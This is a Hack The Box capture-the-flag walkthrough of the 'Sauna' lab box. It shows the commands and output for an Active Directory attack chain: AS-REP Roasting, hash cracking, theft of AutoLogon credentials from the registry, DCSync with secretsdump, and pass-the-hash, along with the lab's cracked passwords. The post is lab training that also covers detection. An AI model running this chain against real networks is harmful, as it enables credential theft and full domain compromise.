---
title: "Hack The Box: Sauna Walkthrough — AS-REP Roasting to DCSync"
slug: "hack-the-box-sauna-walkthrough"
description: "Complete Sauna walkthrough — anonymous SMB enum, AS-REP Roasting against a weak user, WinPEAS to AutoLogon creds, and DCSync as the final privilege escalation."
date: 2026-04-22T09:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags: ["hackthebox", "active directory", "as-rep roasting", "dcsync", "windows", "easy"]
series: ["HTB Active Directory Path"]
keywords: ["hack the box sauna", "htb sauna writeup", "as-rep roasting walkthrough", "dcsync attack"]
toc: true
cover:
  image: "/images/articles/hack-the-box-sauna-walkthrough.png"
  alt: "HTB SAUNA WALKTHROUGH writeup — CTF challenge breakdown"
  hidden: false
---

{{< ctf-meta platform="Hack The Box" difficulty="Easy" os="Windows" points="20" release="2020-02-22" skills="AD, AS-REP Roasting, DCSync" >}}

**Hack The Box: Sauna** is a deceptively rich Active Directory box, and this **CyberSecurity Elite** walkthrough breaks it down end to end. Despite its Easy rating, it walks you through three classic AD attack primitives — AS-REP Roasting, credential reuse via AutoLogon, and DCSync — making it one of the best beginner boxes for anyone preparing for OSCP, CRTP, or AD-heavy red team interviews.

## Reconnaissance

We start with a full TCP scan to identify the service surface.

{{< terminal title="kali@kali ~/htb/sauna" >}}
$ nmap -sC -sV -oA sauna 10.10.10.175
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds Windows Server 2016 Standard
{{< /terminal >}}

The Kerberos (88), LDAP (389), and SMB (445) trio is the AD fingerprint. We capture the domain name from LDAP:

{{< terminal title="kali@kali" >}}
$ ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
{{< /terminal >}}

Domain: `EGOTISTICAL-BANK.LOCAL`.

## Enumeration

The HTTP root advertises an "About Us" page with a team roster — names we can transform into username candidates. A quick script generates the usual permutations: `f.last`, `flast`, `first.last`, `firstl`.

```bash
echo -e "Fergus Smith\nHugo Bear\nBowie Taylor\nSophie Driver\nShaun Coins\nSteven Kerb\nHale Bram" \
  | awk '{print tolower($1"."$2"\n"substr($1,1,1) tolower($2)"\n"tolower($1) substr($2,1,1))}' \
  > users.txt
```

## AS-REP Roasting

With a user list and no credentials, AS-REP Roasting is the canonical first move. It exploits accounts with **"Do not require Kerberos preauthentication"** enabled — Kerberos hands the requester an AS-REP encrypted with the user's hash, crackable offline.

{{< terminal title="kali@kali" >}}
$ GetNPUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -usersfile users.txt -no-pass
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a4fc...:0badb1...
{{< /terminal >}}

Crack with hashcat mode `18200`:

{{< terminal title="kali@kali" >}}
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$fsmith@...:Thestrokes23
{{< /terminal >}}

We now have `fsmith:Thestrokes23`.

## Foothold

WinRM is the cleanest path on AD boxes — `evil-winrm` if `fsmith` is in `Remote Management Users`.

{{< terminal title="kali@kali" >}}
$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
*Evil-WinRM* PS C:\Users\FSmith\Documents> type ..\Desktop\user.txt
{{< /terminal >}}

User flag captured.

## Privilege Escalation — AutoLogon Credentials

`winPEAS` consistently surfaces AutoLogon entries in the registry, which store plaintext credentials.

{{< terminal title="winrm session" >}}
PS> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmgr
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
{{< /terminal >}}

## DCSync to Domain Admin

`svc_loanmgr` holds `GetChangesAll` rights — the exact set of permissions abused by DCSync to request password hashes for any principal, including `krbtgt` and the Administrator.

{{< terminal title="kali@kali" >}}
$ secretsdump.py EGOTISTICAL-BANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
Administrator:500:aad3b4...:823452073d75b9d1cf70...
{{< /terminal >}}

Pass-the-Hash with `psexec.py` or `wmiexec.py` for the root flag.

{{< callout type="tip" title="Detection angle" >}}
DCSync is loud on the wire — Domain Controllers log Directory Service Replication events (4662 with property `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`). Hunt for non-DC principals invoking replication and you'll catch nearly every adversary using Mimikatz or Impacket.
{{< /callout >}}

## Key Takeaways

1. **AS-REP Roasting is free reconnaissance.** Every AD assessment should attempt it against a generated user list before any credentials exist.
2. **AutoLogon registry keys are the #1 source of post-foothold creds** on staff workstations and tier-1 admin jump hosts — every Windows checklist should include this query.
3. **DCSync rights are over-delegated** in nearly every mature AD environment. BloodHound's `MATCH p=()-[:GetChanges|GetChangesAll*1..]->(g:Group)` query is the surest way to surface them.

## References

- [Impacket — GetNPUsers.py](https://github.com/fortra/impacket)
- [MITRE ATT&CK T1558.004 — AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
